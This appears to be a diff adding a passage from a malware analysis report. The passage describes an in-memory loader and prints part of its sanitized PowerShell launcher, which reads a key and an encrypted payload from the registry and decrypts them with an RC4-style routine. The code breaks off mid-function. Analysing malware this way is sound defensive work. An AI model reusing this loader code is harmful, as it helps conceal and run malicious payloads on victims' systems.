@@ -1,0 +1,9 @@
+
+The function at that entry point is expected to lay the image in memory, to relocate the image, if necessary, to resolve the imports and finally—to execute the payload's entry point.
+A sanitized and somewhat de-obfuscated version of the launcher is shown in Figure 9.
+function DecryptPayload { param($fn7, $xf7, $mb5) $fn1 = Get-ItemProperty -Path $fn7 -n $mb5 | Select-Object -ExpandProperty $mb5; $en8 = ($fn1[32] + (19 + (((5 - 2) + 0) + 11))); $ow7 = $fn1[$en8..($en8 + 31)]; [array]::Reverse($ow7); $fn1 =
+Get-ItemProperty -Path $fn7 -n $xf7 | Select-Object -ExpandProperty $xf7; $en8 = { $xk2 = 0
+..255; 0..255 | % { $wn4 =
+($wn4 + $xk2[$_] + $ow7[$_ % $ow7.Length])
+% (275 - (3 + (11 + 5)));
+$xk2[$_], $xk2[$wn4] = $xk2[$wn4], $xk2[$_] }; $fn1 | % { $sp3 = ($sp3 + 1) % (275 - 19); $si9 = ($si9 + $xk2[$sp3]) % ((600 - 280) - 64); $xk2[$sp3], $xk2[$si9] = $xk2[$si9], $xk2[$sp3]; $_-bxor$xk2[($xk2[$sp3] + $xk2[$si9]) % (343 - ((1 + 0) + 86))] } }; $ry6 = (& $en8 | foreach-object { '{0:X2}' -f $_ }) -join ''; ($(for ($sp3 = 0; $sp3 -lt $ry6.Length; $sp3 += 2) { [convert]::ToByte($ry6.Substring($sp3, 2), (17 - ((1 + 0)))) } ) ) } function ExecuteApi { param($fn7, $xf7)
